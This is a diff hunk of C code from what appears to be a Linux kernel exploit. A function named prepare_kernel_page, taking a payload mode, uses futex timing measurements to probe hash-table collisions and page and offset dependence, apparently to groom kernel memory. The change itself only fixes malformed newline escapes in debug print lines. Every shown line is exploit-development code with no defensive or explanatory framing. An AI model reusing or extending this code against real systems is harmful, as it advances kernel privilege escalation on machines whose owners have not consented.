@@ -836,7 +836,7 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
       size_t tB = __measure_raw(T);
       __increase(ks, 128, APPENDED_FUTEXES);
       usleep(300000);
-      pr_info("[OVAL-P0] T tA=%zu tB=%zu (tA>=100 required for validity)"+BS+"n", tA, tB);
+      pr_info("[OVAL-P0] T tA=%zu tB=%zu (tA>=100 required for validity)\n", tA, tB);
       /* P1: fraction of random addrs colliding = 1/true_hashsize */
       size_t coll = 0, ntry = 0;
       for (size_t i = 2; i < ks->total_futexes && ntry < 512; ++i) {
@@ -852,7 +852,7 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
         ntry++;
         if (a1 > 3 * b1 + 8) coll++;
       }
-      pr_info("[OVAL-P1] coll=%zu/%zu -> true hashsize ~ %zu"+BS+"n",
+      pr_info("[OVAL-P1] coll=%zu/%zu -> true hashsize ~ %zu\n",
               coll, ntry, ntry / (coll ? coll : 1));
       /* P2: same-offset next-page (T+4096): page-dependence */
       {
@@ -860,7 +860,7 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
         size_t a1 = __measure_raw(c);
         __decrease(ks, 128);
         size_t b1 = __measure_raw(c);
-        pr_info("[OVAL-P2] T+page a=%zu b=%zu (slow => page ignored!)" + BS + "n", a1, b1);
+        pr_info("[OVAL-P2] T+page a=%zu b=%zu (slow => page ignored!)\n", a1, b1);
         __increase(ks, 128, APPENDED_FUTEXES);
         usleep(300000);
       }
@@ -870,7 +870,7 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
         size_t a1 = __measure_raw(c);
         __decrease(ks, 128);
         size_t b1 = __measure_raw(c);
-        pr_info("[OVAL-P3] T+4 a=%zu b=%zu (slow => offset ignored!)" + BS + "n", a1, b1);
+        pr_info("[OVAL-P3] T+4 a=%zu b=%zu (slow => offset ignored!)\n", a1, b1);
         __increase(ks, 128, APPENDED_FUTEXES);
         usleep(300000);
       }
